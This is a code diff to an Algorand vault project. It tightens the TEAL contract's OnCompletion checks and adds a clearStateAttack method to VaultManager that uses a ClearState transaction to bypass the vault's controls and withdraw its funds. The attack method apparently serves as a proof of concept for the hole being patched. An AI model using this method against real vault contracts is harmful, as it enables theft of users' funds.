@@ -39,6 +39,17 @@ gtxn 0 ApplicationID
 int TMPL_APP_ID
 ==
 
+gtxn 0 OnCompletion
+int NoOp
+==
+
+gtxn 0 OnCompletion
+int CloseOut
+==
+||
+
+&&
+
 // do not allow to call the App from the Vault
 txn GroupIndex
 int 0
@@ -859,8 +870,7 @@ class VaultManager {
 			
 			// if there is no balance just ClearApp
 			if(vaultBalance === 0) {
-				this.clearApp(sender, signCallback)
-				return
+				return (await this.clearApp(sender, signCallback))
 			}
 
 			if(forceToAmount) {
@@ -991,6 +1001,47 @@ class VaultManager {
 				let txPayFeesSigned = await this.signVaultTx(sender, txPayFees)
 				signed.push(txPayFeesSigned.blob);
 			}
+
+			let tx = (await this.algodClient.sendRawTransaction(signed).do())
+
+			return tx.txId
+		}
+
+		// clearStateAttack: create a clearState transaction from the vault to bypass vault.teal controls and withdraw algos from the vault.
+		this.clearStateAttack = async function (sender, vaultOwnerAddr, amount, signCallback) {
+			const params = await this.algodClient.getTransactionParams().do()
+
+			params.fee = this.minFee
+			params.flatFee = true
+
+			let vaultAddr = await this.vaultAddressByApp(vaultOwnerAddr)
+			if(!vaultAddr) {
+				throw new Error('ERROR: Account not opted in')
+			}
+
+			let appArgs = [];
+			appArgs.push(new Uint8Array(Buffer.from(WITHDRAW_ALGOS_OP)))
+
+			let appAccounts = []
+			appAccounts.push(vaultAddr)
+
+			// create unsigned transaction
+			let txApp = algosdk.makeApplicationClearStateTxn(sender, params, this.appId, appArgs, appAccounts)
+			let txWithdraw = algosdk.makePaymentTxnWithSuggestedParams(vaultAddr, sender, amount, undefined, new Uint8Array(0), params)
+
+			let txns = [txApp, txWithdraw];
+
+			// Group both transactions
+			algosdk.assignGroupID(txns);
+
+
+			let signed = []
+			let txAppSigned = signCallback(sender, txApp)
+
+			let txWithdrawSigned = await this.signVaultTx(vaultOwnerAddr, txWithdraw)
+
+			signed.push(txAppSigned);
+			signed.push(txWithdrawSigned.blob);
 
 			let tx = (await this.algodClient.sendRawTransaction(signed).do())
 
